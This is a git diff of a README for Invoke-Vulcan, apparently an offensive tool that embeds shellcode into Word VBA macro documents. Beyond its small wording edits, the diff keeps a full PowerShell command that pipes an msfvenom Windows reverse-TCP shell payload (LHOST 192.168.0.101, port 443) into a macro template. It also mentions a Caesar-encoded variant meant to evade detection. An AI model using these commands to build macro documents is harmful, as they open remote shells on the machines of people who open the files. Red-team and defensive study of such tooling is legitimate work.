@@ -62,14 +62,12 @@ wsl --exec msfvenom ... -f hex | Invoke-Vulcan ...
 
 ### Examples
 
-- Embed a "plain" shellcode:
+- Embed a `plain` shellcode:
 
     ```powershell
     .\Invoke-Vulcan.ps1; wsl --exec msfvenom -p windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread -f hex | `
         Invoke-Vulcan -OutputDirectory ".\winwords\" -Template ".\assets\templates\indirect.vba"
     ```
-
-> Although obvious, `windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread` is a placeholder for your own values... 🙄
 
 - Embed a `Caesar`-encoded shellcode:
 
@@ -90,7 +88,7 @@ wsl --exec msfvenom ... -f hex | Invoke-Vulcan ...
     > [!WARNING]
     > The length of the key must be shorted than the shellcode.
 
-> Although obvious, `windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread` is a placeholder for your own values... 🙄
+> Although obvious, `windows/shell/reverse_tcp LHOST=192.168.0.101 LPORT=443 EXITFUNC=thread` is a placeholder for your own values in the above examples... 🙄
 
 ## Sponsor 💓
 
